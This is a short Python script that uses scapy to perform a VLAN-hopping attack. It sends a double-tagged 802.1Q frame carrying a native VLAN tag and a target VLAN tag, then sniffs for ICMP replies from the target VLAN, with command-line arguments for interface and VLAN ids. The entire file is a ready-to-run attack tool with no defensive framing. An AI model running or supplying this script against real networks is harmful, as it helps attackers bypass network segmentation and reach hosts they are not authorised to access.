import sys
from scapy.all import Ether, Dot1Q, IP, ICMP, sendp, sniff

def vlan_hopping(interface, native_vlan, target_vlan):
    double_tagged_frame = (
        Ether(src="00:11:22:33:44:55", dst="01:80:c2:00:00:00") /
        Dot1Q(vlan=native_vlan) /
        Dot1Q(vlan=target_vlan) /
        IP(src="192.168.1.1", dst="192.168.1.2") /
        ICMP()
    )

    def handle_packet(packet):
        if packet.haslayer(ICMP):
            print("Received response from target:")
            packet.show()

    print("Sending double-tagged frame...")
    sendp(double_tagged_frame, iface=interface, verbose=False)

    print("Sniffing for responses...")
    sniff(iface=interface, filter=f"vlan {target_vlan} and icmp", prn=handle_packet, timeout=10)

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: python vlan_hopping.py <interface> <native_vlan> <target_vlan>")
        sys.exit(1)

    iface, native_vlan, target_vlan = sys.argv[1], int(sys.argv[2]), int(sys.argv[3])
    vlan_hopping(iface, native_vlan, target_vlan)
